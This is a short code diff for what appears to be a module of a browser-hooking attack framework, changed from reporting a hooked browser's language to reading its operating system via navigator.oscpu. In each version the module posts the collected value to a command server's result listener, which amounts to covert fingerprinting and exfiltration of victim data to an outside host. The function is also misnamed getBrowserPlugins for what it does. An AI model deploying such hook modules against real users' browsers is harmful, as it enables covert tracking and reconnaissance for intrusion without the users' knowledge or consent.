@@ -1,11 +1,12 @@
 /*
-Module to return language of the hooked browser
+Grabbing the user OS
 */
 
-(function getLanguage() {
+(function getBrowserPlugins() {
     let formData = new FormData();
-    formData.append('result', navigator.language || navigator.userLanguage);
-    formData.append('module_value', 'language.js')
+
+    formData.append('result', navigator.oscpu)
+    formData.append('module_value', 'os.js')
 
     fetch(`http://${serverAddress}/command/result_listener`, {
         method: "POST",
